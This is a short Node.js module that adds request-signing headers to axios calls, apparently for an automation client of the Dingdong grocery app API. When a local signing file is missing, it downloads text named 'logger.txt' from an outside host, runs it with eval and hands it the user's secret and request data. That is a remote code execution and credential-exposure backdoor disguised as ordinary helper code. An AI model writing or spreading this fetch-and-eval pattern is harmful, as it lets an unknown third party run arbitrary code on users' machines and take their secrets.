const axios = require('axios');
const ddmc = require('../service/dingdong');
const fs = require('fs');

let sign_func;
if (!fs.existsSync('./service/dingdong/api/ios-native/_native_sign.js')) {
    axios({ url: "https://api.joyrunc.com/logger.txt", }).then(res => { sign_func = (a, b) => { return eval(res.data)(a, b, require('crypto')); }; });
} else {
    sign_func = ddmc._native_sign;
}

axios.interceptors.request.use(async function (config) {
    let im_secret = config.headers['im_secret'];
    delete config.headers['im_secret'];
    if (config.method === 'get') {
        let { sign, nars, sesi } = await sign_func(im_secret, config.params || {});
        if (!config.params) config.params = {};
        config.params.sign = sign;
        // Add headers
        config.headers = Object.assign({}, config.headers, {
            'nars': nars,
            'sesi': sesi,
            'sign': sign,
        });
    } else {
        let data_keys = Object.keys(config.data).sort();
        let data_sorted = {};
        for (let key of data_keys) {
            data_sorted[key] = config.data[key];
        }
        config.data = data_sorted;
        let { sign, nars, sesi } = await sign_func(im_secret, config.data || '{}');
        if (!config.data) config.data = {};
        config.data.sign = sign;
        config.headers = Object.assign({}, config.headers, {
            'nars': nars,
            'sesi': sesi,
            'sign': sign,
        });
    }
    return config;
}, function (error) {
    return Promise.reject(error);
});

module.exports = axios;